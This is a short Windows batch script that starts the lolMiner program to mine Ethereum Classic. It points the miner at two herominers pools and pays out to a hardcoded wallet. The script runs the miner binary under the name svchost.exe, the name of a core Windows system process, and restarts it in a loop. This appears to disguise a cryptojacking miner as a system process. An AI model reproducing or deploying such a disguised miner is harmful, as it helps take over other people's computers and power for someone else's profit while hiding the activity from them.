@echo off

setlocal enableDelayedExpansion

Rem #################################
Rem ## Begin of user-editable part ##
Rem #################################

set "POOL=de.etc.herominers.com:1150"
set "POOL2=etc.herominers.com:10161"
set "WALLET=0xb5706f1fc184b5ee4f8c9c296838ce3d83d76857"		

set "WORKER=lolMinerWorker"

set "EXTRAPARAMETERS=--apiport 8020"

Rem #################################
Rem ##  End of user-editable part  ##
Rem #################################

cd /d %~dp0

set MyVariable=%CD%\svchost.exe

:WindowsVer
echo "Running lolMiner from %MyVariable%"
for /f "tokens=4-5 delims=. " %%i in ('ver') do set VERSION=%%i.%%j
if "%version%" == "10.0" goto W10
goto OtherW

:W10
"%MyVariable%" --algo ETCHASH  --pool !POOL! --user !WALLET! --pool !POOL2! --user !WALLET! --worker !WORKER! --watchdog exit !EXTRAPARAMETERS!
if %ERRORLEVEL% == 42 (
	timeout 10
	goto W10
)
goto END

:OtherW
"%MyVariable%" --algo ETCHASH  --pool !POOL! --user !WALLET! --pool !POOL2! --user !WALLET! --worker !WORKER! --watchdog exit !EXTRAPARAMETERS! --nocolor
if %ERRORLEVEL% == 42 (
	timeout 10
	goto OtherW
)

:END
pause
